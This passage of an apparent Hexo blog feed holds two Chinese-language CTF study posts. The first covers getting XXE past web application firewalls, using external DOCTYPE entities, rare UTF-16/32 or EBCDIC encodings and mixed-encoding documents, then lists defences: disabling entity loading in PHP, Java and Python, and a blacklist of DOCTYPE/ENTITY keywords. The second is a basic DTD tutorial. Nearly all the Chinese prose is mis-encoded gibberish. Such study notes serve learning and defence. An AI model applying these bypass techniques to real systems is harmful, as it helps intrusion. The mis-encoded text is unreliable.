æ•ˆ(é“¾æ¥åˆ°æœªçŸ¥å®ä½“)</h4><p>ä¸ºäº†å®‰å…¨èµ·è§ï¼Œä¸€äº›WAFé€šå¸¸ä¸ä¼šè¯»å–é“¾æ¥æ–‡ä»¶çš„å†…å®¹ï¼Œä½†å¤–éƒ¨èµ„æºé“¾æ¥è¿˜å¯ä»¥å­˜åœ¨äºå£°æ˜&lt;!DOCTYPE&gt;ä¸­ã€‚è¿™æ„å‘³ç€æœªè¯»å–æ–‡ä»¶å†…å®¹çš„WAFå°†ä¸ä¼šè¯»å–æ–‡æ¡£ä¸­å®ä½“çš„å£°æ˜,è¿™æ ·åœ¨åç»­æ­£æ–‡ä¸­ä½¿ç”¨å¤–éƒ¨é“¾æ¥ä¸­çš„å®ä½“ï¼Œå°±ä¼šè¢«wafçš„xmlè§£æå™¨è®¤ä¸ºæ˜¯æœªçŸ¥å®ä½“ï¼Œå¯¼è‡´é”™è¯¯</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407040003001.jpg"                      alt="image-20220501155941595"                ><figcaption>image-20220501155941595</figcaption></figure></p><h4 id="ç½•è§ç¼–ç "><a href="#ç½•è§ç¼–ç " class="headerlink" title="ç½•è§ç¼–ç "></a>ç½•è§ç¼–ç </h4><p>ä¸€ä¸ªxmlæ–‡æ¡£ä¸ä»…å¯ä»¥ç”¨UTF-8ç¼–ç ï¼Œä¹Ÿå¯ä»¥ç”¨UTF-16(ä¸¤ä¸ªå˜ä½“â€Š-â€ŠBEå’ŒLE)ã€UTF-32(å››ä¸ªå˜ä½“â€Š-â€ŠBEã€LEã€2143ã€3412)å’ŒEBCDICç¼–ç ã€‚åœ¨è¿™ç§ç¼–ç çš„å¸®åŠ©ä¸‹ï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å¯ä»¥å¾ˆå®¹æ˜“åœ°ç»•è¿‡WAFï¼Œå› ä¸ºåœ¨è¿™ç§ç±»å‹çš„WAFä¸­ï¼Œæ­£åˆ™è¡¨è¾¾å¼é€šå¸¸ä»…é…ç½®ä¸ºå•å­—ç¬¦é›†ã€‚</p><blockquote><p>æ”¹å˜ç¼–ç å¯ä»¥åˆ©ç”¨vscodeçš„æŒ‰å…¶ä»–ç¼–ç ä¿å­˜</p></blockquote><p>ä¾‹é¢˜ï¼š[CSAWQual 2019]Web_Unagi</p><h4 id="åœ¨ä¸€ä¸ªæ–‡æ¡£ä¸­ä½¿ç”¨ä¸¤ç§ç±»å‹çš„ç¼–ç "><a href="#åœ¨ä¸€ä¸ªæ–‡æ¡£ä¸­ä½¿ç”¨ä¸¤ç§ç±»å‹çš„ç¼–ç " class="headerlink" title="åœ¨ä¸€ä¸ªæ–‡æ¡£ä¸­ä½¿ç”¨ä¸¤ç§ç±»å‹çš„ç¼–ç "></a>åœ¨ä¸€ä¸ªæ–‡æ¡£ä¸­ä½¿ç”¨ä¸¤ç§ç±»å‹çš„ç¼–ç </h4><p>å½“åŒ…å«ç¼–ç å±æ€§çš„<?xml?>æ ‡è®°å¼•ç”¨ä¸æ–‡æ¡£é¦–å­—èŠ‚å†³å®šçš„å­—ç¬¦é›†ä¸åŒæ—¶ï¼Œä¸€äº›è§£æå™¨æ›´æ”¹ç¼–ç ï¼Œä½¿æ–‡ä»¶çš„å¼€å¤´æœ‰ä¸€ç»„å­—ç¬¦ï¼Œå…¶ä½™çš„æ˜¯å¦ä¸€ç»„ç¼–ç ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸åŒçš„è§£æå™¨å¯èƒ½åœ¨ä¸åŒçš„æ—¶é—´è½¬æ¢ç¼–ç ã€‚Javaè§£æå™¨(javax.xml.parsers)åœ¨<?xml?>ç»“æŸåä¸¥æ ¼åœ°æ›´æ”¹å­—ç¬¦é›†ï¼Œè€Œlibxml2è§£æå™¨å¯ä»¥åœ¨æ‰§è¡Œâ€œç¼–ç â€å±æ€§çš„å€¼ä¹‹åæˆ–åœ¨å¤„ç†<?xml?>ä¹‹å‰æˆ–ä¹‹ååˆ‡æ¢ç¼–ç ã€‚<br>åªæœ‰åœ¨æ ¹æœ¬ä¸å¤„ç†è¿™äº›æ–‡ä»¶æ—¶ï¼Œæ¯”è¾ƒæˆç†Ÿçš„WAFæ‰èƒ½å¯é åœ°é˜²æ­¢è¿™äº›æ–‡ä»¶ä¸­çš„æ”»å‡»ã€‚æˆ‘ä»¬è¿˜å¿…é¡»è®°ä½ï¼Œæœ‰è®¸å¤šåŒä¹‰è¯ç¼–ç ï¼Œä¾‹å¦‚UTF-32BEå’ŒUCS-4BEã€‚æ­¤å¤–ï¼Œæœ‰äº›ç¼–ç å¯èƒ½ä¸åŒï¼Œä½†ä»ç¼–ç æ–‡æ¡£åˆå§‹éƒ¨åˆ†â€Š<code>&lt;?xml?&gt;</code>çš„è§’åº¦æ¥çœ‹ï¼Œå®ƒä»¬æ˜¯å…¼å®¹çš„ã€‚ä¾‹å¦‚ï¼Œçœ‹ä¼¼UTF-8çš„æ–‡æ¡£å¯èƒ½åŒ…å«å­—ç¬¦ä¸²<code>&lt;?xml version=â€1.0â€ encoding=â€windows-1251â€?&gt;</code>ã€‚<br>è¿™é‡Œæœ‰ä¸€äº›ä¾‹å­ã€‚ä¸ºäº†ç®€æ˜æ‰¼è¦ï¼Œæˆ‘ä»¬ä¸æŠŠXXEæ”¾åœ¨æ–‡æ¡£é‡Œã€‚<br>libxml2è§£æå™¨å°†æ–‡æ¡£è§†ä¸ºæœ‰æ•ˆï¼Œä½†æ˜¯ï¼Œjavax.xml.parsers setä¸­çš„Javaå¼•æ“è®¤ä¸ºå®ƒæ— æ•ˆï¼š</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407040003488.jpg"                      alt="image-20220501161313385"                ><figcaption>image-20220501161313385</figcaption></figure></p><blockquote><p>æ§åˆ¶æ–‡æ¡£çš„ç¼–ç ï¼ˆä¾‹å¦‚<?xml?>ï¼‰â€”â€”æ–‡æ¡£çš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¸¦æœ‰å¯é€‰çš„BOM(å­—èŠ‚é¡ºåºæ ‡è®°)ã€‚</p></blockquote><h2 id="XXEé˜²å¾¡"><a href="#XXEé˜²å¾¡" class="headerlink" title="XXEé˜²å¾¡"></a>XXEé˜²å¾¡</h2><h3 id="æ–¹æ¡ˆä¸€ï¼šä½¿ç”¨è¯­è¨€ä¸­æ¨èçš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•"><a href="#æ–¹æ¡ˆä¸€ï¼šä½¿ç”¨è¯­è¨€ä¸­æ¨èçš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•" class="headerlink" title="æ–¹æ¡ˆä¸€ï¼šä½¿ç”¨è¯­è¨€ä¸­æ¨èçš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•"></a><strong>æ–¹æ¡ˆä¸€ï¼šä½¿ç”¨è¯­è¨€ä¸­æ¨èçš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•</strong></h3><p><strong>PHPï¼š</strong></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure></div><p><strong>JAVA:</strong></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;,false)</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;,false);</span><br></pre></td></tr></table></figure></div><p>java:<a class="link"   href="https://xz.aliyun.com/t/10774#toc-11" >https://xz.aliyun.com/t/10774#toc-11 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link"   href="https://xz.aliyun.com/t/3357#toc-20" >https://xz.aliyun.com/t/3357#toc-20 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><strong>Pythonï¼š</strong></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xxe</span>():</span><br><span class="line">    tree = etree.parse(<span class="string">&#x27;xml.xml&#x27;</span>, etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br><span class="line">    <span class="comment"># tree = lxml.objectify.parse(&#x27;xml.xml&#x27;, etree.XMLParser(resolve_entities=False))</span></span><br><span class="line">    <span class="keyword">return</span> etree.tostring(tree.getroot())</span><br></pre></td></tr></table></figure></div><blockquote><p>å°è¯•æ”¹ç”¨defusedxml æ˜¯ä¸€ä¸ªçº¯ Python è½¯ä»¶åŒ…ï¼Œå®ƒä¿®æ”¹äº†æ‰€æœ‰æ ‡å‡†åº“ XML è§£æå™¨çš„å­ç±»ï¼Œå¯ä»¥é˜²æ­¢ä»»ä½•æ½œåœ¨çš„æ¶æ„æ“ä½œã€‚ å¯¹äºè§£æä¸å—ä¿¡ä»»çš„XMLæ•°æ®çš„ä»»ä½•æœåŠ¡å™¨ä»£ç ï¼Œå»ºè®®ä½¿ç”¨æ­¤ç¨‹åºåŒ…ã€‚</p></blockquote><h3 id="æ–¹æ¡ˆäºŒï¼šæ‰‹åŠ¨é»‘åå•è¿‡æ»¤-ä¸æ¨è"><a href="#æ–¹æ¡ˆäºŒï¼šæ‰‹åŠ¨é»‘åå•è¿‡æ»¤-ä¸æ¨è" class="headerlink" title="æ–¹æ¡ˆäºŒï¼šæ‰‹åŠ¨é»‘åå•è¿‡æ»¤(ä¸æ¨è)"></a><strong>æ–¹æ¡ˆäºŒï¼šæ‰‹åŠ¨é»‘åå•è¿‡æ»¤(ä¸æ¨è)</strong></h3><p>è¿‡æ»¤å…³é”®è¯ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPEã€&lt;!ENTITY SYSTEMã€PUBLIC</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DTDå­¦ä¹ </title>
      <link href="/2022/04/21/DTD%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/04/21/DTD%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p><strong>æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰å¯å®šä¹‰åˆæ³•çš„XMLæ–‡æ¡£æ„å»ºæ¨¡å—ã€‚å®ƒä½¿ç”¨ä¸€ç³»åˆ—åˆæ³•çš„å…ƒç´ æ¥å®šä¹‰æ–‡æ¡£çš„ç»“æ„ã€‚</strong></p><p><strong>DTD å¯è¢«æˆè¡Œåœ°å£°æ˜äº XML æ–‡æ¡£ä¸­ï¼Œä¹Ÿå¯ä½œä¸ºä¸€ä¸ªå¤–éƒ¨å¼•ç”¨ã€‚</strong></p><h3 id="å†…éƒ¨DOCTYPEå£°æ˜"><a href="#å†…éƒ¨DOCTYPEå£°æ˜" class="headerlink" title="å†…éƒ¨DOCTYPEå£°æ˜"></a>å†…éƒ¨DOCTYPEå£°æ˜</h3><p>è¯­æ³•</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt;  &lt;!--æ ¹å…ƒç´ æ˜¯xmlæ–‡ä»¶çš„æ ¹å…ƒç´ --&gt;</span><br></pre></td></tr></table></figure></div><p>å¸¦æœ‰ DTD çš„ XML æ–‡æ¡£å®ä¾‹</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;George&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Do not forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></div><blockquote><h3 id="ä»¥ä¸Š-DTD-è§£é‡Šå¦‚ä¸‹ï¼š"><a href="#ä»¥ä¸Š-DTD-è§£é‡Šå¦‚ä¸‹ï¼š" class="headerlink" title="ä»¥ä¸Š DTD è§£é‡Šå¦‚ä¸‹ï¼š"></a>ä»¥ä¸Š DTD è§£é‡Šå¦‚ä¸‹ï¼š</h3><p><em>!DOCTYPE note</em> (ç¬¬äºŒè¡Œ)å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ <em>note</em> ç±»å‹çš„æ–‡æ¡£ã€‚</p><p><em>!ELEMENT note</em> (ç¬¬ä¸‰è¡Œ)å®šä¹‰ <em>note</em> å…ƒç´ æœ‰å››ä¸ªå…ƒç´ ï¼šâ€toã€fromã€heading,ã€bodyâ€</p><p><em>!ELEMENT to</em> (ç¬¬å››è¡Œ)å®šä¹‰ <em>to</em> å…ƒç´ ä¸º â€œ#PCDATAâ€ ç±»å‹</p><p><em>!ELEMENT from</em> (ç¬¬äº”è¡Œ)å®šä¹‰ <em>from</em> å…ƒç´ ä¸º â€œ#PCDATAâ€ ç±»å‹</p><p><em>!ELEMENT heading</em> (ç¬¬å…­è¡Œ)å®šä¹‰ <em>heading</em> å…ƒç´ ä¸º â€œ#PCDATAâ€ ç±»å‹</p><p><em>!ELEMENT body</em> (ç¬¬ä¸ƒè¡Œ)å®šä¹‰ <em>body</em> å…ƒç´ ä¸º â€œ#PCDATAâ€ ç±»å‹</p></blockquote><h3 id="å¤–éƒ¨æ–‡æ¡£å£°æ˜"><a href="#å¤–éƒ¨æ–‡æ¡£å£°æ˜" class="headerlink" title="å¤–éƒ¨æ–‡æ¡£å£°æ˜"></a>å¤–éƒ¨æ–‡æ¡£å£°æ˜</h3><p>DTDä½äºXMLæºæ–‡ä»¶å¤–éƒ¨,è¯­æ³•</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM &quot;æ–‡ä»¶å&quot;&gt;</span><br></pre></td></tr></table></figure></div><p>å®ä¾‹</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Do not forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt; </span><br></pre></td></tr></table></figure></div><p>åŒ…å«çš„note.dtdæ–‡ä»¶</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure></div><h3 id="ç”¨å¤„"><a href="#ç”¨å¤„" class="headerlink" title="ç”¨å¤„"></a>ç”¨å¤„</h3><p>é€šè¿‡ DTDï¼Œæ¯ä¸€ä¸ª XML æ–‡ä»¶å‡å¯æºå¸¦ä¸€ä¸ªæœ‰å…³å…¶è‡ªèº«æ ¼å¼çš„æè¿°ã€‚</p><p>é€šè¿‡ DTDï¼Œç‹¬ç«‹çš„å›¢ä½“å¯ä¸€è‡´åœ°ä½¿ç”¨æŸä¸ªæ ‡å‡†çš„ DTD æ¥äº¤æ¢æ•°æ®ã€‚</p><h2 id="æ„å»ºæ¨¡å—"><a href="#æ„å»ºæ¨¡å—" class="headerlink" title="æ„å»ºæ¨¡å—"></a>æ„å»ºæ¨¡å—</h2><p>æ‰€æœ‰çš„ XML æ–‡æ¡£ï¼ˆä»¥åŠ HTML æ–‡æ¡£ï¼‰å‡ç”±ä»¥ä¸‹ç®€å•çš„æ„å»ºæ¨¡å—æ„æˆï¼š</p><ul><li>å…ƒç´ </li><li>å±æ€§</li><li>å®ä½“</li><li>PCDATA </li><li>CDATA</li></ul><h3 id="å…ƒç´ "><a href="#å…ƒç´ " class="headerlink" title="å…ƒç´ "></a>å…ƒç´ </h3><p>ç”±é—­åˆæ ‡ç­¾åŠå†…å®¹(æ–‡æœ¬æˆ–ç©º)æ„æˆ</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>body text in between<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>some message in between<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="å±æ€§"><a href="#å±æ€§" class="headerlink" title="å±æ€§"></a>å±æ€§</h3><p>æä¾›<em>æœ‰å…³å…ƒç´ çš„é¢å¤–ä¿¡æ¯</em>ã€‚</p><p>å…ƒç´ ä¸ºç©ºæ—¶</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;computer.gif&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><p>å…ƒç´ æœ‰å†…å®¹æ—¶</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">person</span> <span class="attr">sex</span>=<span class="string">&quot;female&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Anna<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">lastname</span>&gt;</span>Smith<span class="tag">&lt;/<span class="name">lastname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span> </span><br></pre></td></tr></table></figure></div><h3 id="å®ä½“"><a href="#å®ä½“" class="headerlink" title="å®ä½“"></a>å®ä½“</h3><p>å®ä½“æ˜¯ç”¨æ¥å®šä¹‰æ™®é€šæ–‡æœ¬çš„å˜é‡ã€‚å®ä½“å¼•ç”¨æ˜¯å¯¹å®ä½“çš„å¼•ç”¨ã€‚</p><p><strong>ä¸‹é¢çš„å®ä½“åœ¨ XML ä¸­è¢«é¢„å®šä¹‰</strong></p><table><thead><tr><th align="left">å®ä½“å¼•ç”¨</th><th align="left">å­—ç¬¦</th></tr></thead><tbody><tr><td align="left"><code>&amp;lt;</code></td><td align="left">&lt;</td></tr><tr><td align="left"><code>&amp;gt;</code></td><td align="left">&gt;</td></tr><tr><td align="left"><code>&amp;amp;</code></td><td align="left">&amp;</td></tr><tr><td align="left"><code>&amp;quot;</code></td><td align="left">â€œ</td></tr><tr><td align="left"><code>&amp;apos;</code></td><td align="left">â€˜</td></tr></tbody></table><h3 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h3><p>PCDATA çš„æ„æ€æ˜¯ä¼šè¢«è§£æçš„å­—ç¬¦æ•°æ®ï¼ˆparsed character dataï¼‰,å­—ç¬¦æ•°æ®å°±æ˜¯é—­åˆæ ‡ç­¾ä¹‹é—´çš„æ–‡æœ¬å†…å®¹</p><p><strong>è¿™äº›æ–‡æœ¬å°†è¢«è§£æå™¨æ£€æŸ¥å®ä½“ä»¥åŠæ ‡è®°ã€‚</strong>æ–‡æœ¬ä¸­çš„æ ‡ç­¾ä¼šè¢«å½“ä½œæ ‡è®°æ¥å¤„ç†ï¼Œè€Œå®ä½“ä¼šè¢«å±•å¼€ã€‚</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>æ­¤æ–‡æœ¬ä¹Ÿä¼šè¢«è§£æ<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h3><p>CDATA çš„æ„æ€æ˜¯å­—ç¬¦æ•°æ®ï¼ˆcharacter dataï¼‰ã€‚<em>CDATA æ˜¯ä¸ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ã€‚</em>åœ¨è¿™äº›æ–‡æœ¬ä¸­çš„æ ‡ç­¾ä¸ä¼šè¢«å½“ä½œæ ‡è®°æ¥å¯¹å¾…ï¼Œå…¶ä¸­çš„å®ä½“ä¹Ÿä¸ä¼šè¢«å±•å¼€ã€‚</p><p>CDATA éƒ¨åˆ†ç”± <code>&lt;![CDATA[</code> å¼€å§‹ï¼Œç”±<code>]]&gt;</code> ç»“æŸï¼š</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">&lt;![CDATA[</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">function matchwo(a,b)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">if (a &lt; b &amp;&amp; a &lt; 0) then</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  return 1;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">else</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  return 0;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">]]&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>CDATA éƒ¨åˆ†ä¸èƒ½åŒ…å«å­—ç¬¦ä¸² â€œ]]&gt;â€ã€‚ä¹Ÿä¸å…è®¸åµŒå¥—çš„ CDATA éƒ¨åˆ†ã€‚</p><p>æ ‡è®° CDATA éƒ¨åˆ†ç»“å°¾çš„ â€œ]]&gt;â€ ä¸èƒ½åŒ…å«ç©ºæ ¼æˆ–æŠ˜è¡Œã€‚</p></blockquote><h2 id="å…ƒç´ å£°æ˜"><a href="#å…ƒç´ å£°æ˜" class="headerlink" title="å…ƒç´ å£°æ˜"></a>å…ƒç´ å£°æ˜</h2><h3 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><p>åœ¨ DTD ä¸­ï¼ŒXML å…ƒç´ é€šè¿‡å…ƒç´ å£°æ˜æ¥è¿›è¡Œå£°æ˜ã€‚å…ƒç´ å£°æ˜ä½¿ç”¨ä¸‹é¢çš„è¯­æ³•ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1âƒ£ï¸&lt;!ELEMENT å…ƒç´ åç§° ç±»åˆ«&gt;</span><br><span class="line">2âƒ£ï¸&lt;!ELEMENT å…ƒç´ åç§° (å…ƒç´ å†…å®¹)&gt;</span><br></pre></td></tr></table></figure></div><h3 id="ç©ºå…ƒç´ "><a href="#ç©ºå…ƒç´ " class="headerlink" title="ç©ºå…ƒç´ "></a>ç©ºå…ƒç´ </h3><p>åˆ©ç”¨å…³é”®å­—<code>EMPTY</code></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT å…ƒç´ åç§° EMPTY&gt;</span><br></pre></td></tr></table></figure></div><p>æ¡ˆä¾‹</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--dtdä¸­å£°æ˜--&gt;</span><br><span class="line">&lt;!ELEMENT br EMPTY&gt;</span><br><span class="line">&lt;!--XMLä¸­--&gt;</span><br><span class="line">&lt;br /&gt;</span><br></pre></td></tr></table></figure></div><h3 id="åªæœ‰PCDATAçš„å…ƒç´ "><a href="#åªæœ‰PCDATAçš„å…ƒç´ " class="headerlink" title="åªæœ‰PCDATAçš„å…ƒç´ "></a>åªæœ‰PCDATAçš„å…ƒç´ </h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT å…ƒç´ åç§° (#PCDATA)&gt;</span><br></pre></td></tr></table></figure></div><h3 id="å¸¦æœ‰ä»»ä½•å†…å®¹çš„å…ƒç´ "><a href="#å¸¦æœ‰ä»»ä½•å†…å®¹çš„å…ƒç´ " class="headerlink" title="å¸¦æœ‰ä»»ä½•å†…å®¹çš„å…ƒç´ "></a>å¸¦æœ‰ä»»ä½•å†…å®¹çš„å…ƒç´ </h3><p>å…³é”®è¯<code>ANY</code></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT å…ƒç´ åç§° ANY&gt;</span><br></pre></td></tr></table></figure></div><h3 id="å¸¦æœ‰å­å…ƒç´ ï¼ˆåºåˆ—ï¼‰çš„å…ƒç´ "><a 